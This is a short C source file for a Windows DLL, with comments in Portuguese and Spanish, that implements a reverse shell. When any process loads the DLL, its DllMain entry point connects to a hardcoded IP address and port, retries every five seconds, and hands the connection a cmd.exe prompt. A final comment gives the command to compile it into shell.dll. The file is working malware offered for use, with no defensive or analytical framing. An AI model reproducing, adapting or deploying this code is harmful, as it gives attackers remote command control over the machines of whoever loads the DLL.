#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

void ReverseShellFunc() {

    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char RecvServer[512];
    int conec;
    char ip_addr[] = "192.168.0.115";
    int port = 8081;

    while (1) {
                     
        WSAStartup(MAKEWORD(2, 2), &wsa); // inicia WinSock
        shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); // cria um tcp socket

        shell_addr.sin_port = htons(port);
        shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
        shell_addr.sin_family = AF_INET;

        conec = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); 

        if (conec == SOCKET_ERROR) {
            Sleep(5000); // Esperar 5 segundos antes de tentar conectar novamente
        } else {
            recv(shell, RecvServer, sizeof(RecvServer), 0);
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;
            CreateProcess(NULL, TEXT("cmd.exe"), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); 
            WaitForSingleObject(pi.hProcess, INFINITE);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            memset(RecvServer, 0, sizeof(RecvServer));
        }
        closesocket(shell); // Fechar o soquete antes de tentar conectar novamente
        WSACleanup(); // Limpar WinSock antes de tentar conectar novamente
    }
    
}


BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            ReverseShellFunc(); // Ejecutar la función reverseShell cuando se carga la DLL
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// COMPILAÇÃO:
// cl /LD reverse_shell.c /link /out:shell.dll ws2_32.lib    compilador 
